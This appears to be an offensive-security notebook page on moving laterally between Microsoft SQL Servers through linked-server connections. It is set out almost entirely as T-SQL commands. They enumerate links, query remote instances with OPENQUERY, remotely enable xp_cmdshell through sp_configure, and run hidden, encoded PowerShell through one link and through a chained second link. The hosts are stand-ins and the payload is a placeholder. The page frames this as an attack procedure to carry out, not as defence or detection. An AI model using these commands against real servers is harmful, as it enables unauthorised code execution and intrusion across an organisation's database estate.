# SQL Lateral Movement
Linked Servers allows a database to access data from an external source.

## Identify and test automatically
Use [[PowerUpSQL#Crawl SQL Server Link]]

## Test manually
1. Discover links of the current instance:
    >SELECT * FROM master..sysservers;

2. Query this remote instance over the link using **OpenQuery**:  
⚠️ Single and double quotes matter!
    > SELECT * FROM OPENQUERY("sql1.evil.corp", 'select @@servername');

3. Check xp_cmdshell via link
Check MS SQL configuration via link
    >SELECT * FROM OPENQUERY("sql1.evil.corp", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

4. If **RPC Out** is enabled on the link (not default), then you can enable xpcmdshell using the following syntax:
    >EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]

    >EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]

5. Exploit via link
    >SELECT * FROM OPENQUERY("sql1.evil.corp", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

    >SELECT * FROM OPENQUERY("sql1.evil.corp", 'select * from openquery("sql01.evil.external", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```